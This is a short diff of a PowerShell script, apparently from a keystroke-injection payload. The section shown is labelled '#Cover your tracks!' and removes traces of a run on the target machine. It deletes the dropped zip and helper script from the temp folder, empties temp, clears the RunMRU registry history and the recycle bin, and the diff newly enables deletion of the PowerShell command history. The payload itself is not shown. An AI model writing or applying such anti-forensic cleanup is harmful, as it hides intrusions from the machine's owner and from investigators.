@@ -86,12 +86,12 @@ $wshell.SendKeys('{END}');  Sleep 5; $wshell.SendKeys('{0}'); Sleep 7; $wshell.S
 #Cover your tracks!
 
 $D="$env:tmp"
-
+cd\
 # Delete the zip
 rm $D\t.zip* -r -Force -ErrorAction SilentlyContinue
 
 # Delete Wait for mouse .ps1
-rm $D\Wm* -r -Force -ErrorAction SilentlyContinue
+rm $D\Wm.ps1 -r -Force -ErrorAction SilentlyContinue
 
 # empty temp folder
 rm $D\t* -r -Force -ErrorAction SilentlyContinue
@@ -100,7 +100,7 @@ rm $D\t* -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
-#Remove-Item (Get-PSreadlineOption).HistorySavePath
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Empty recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
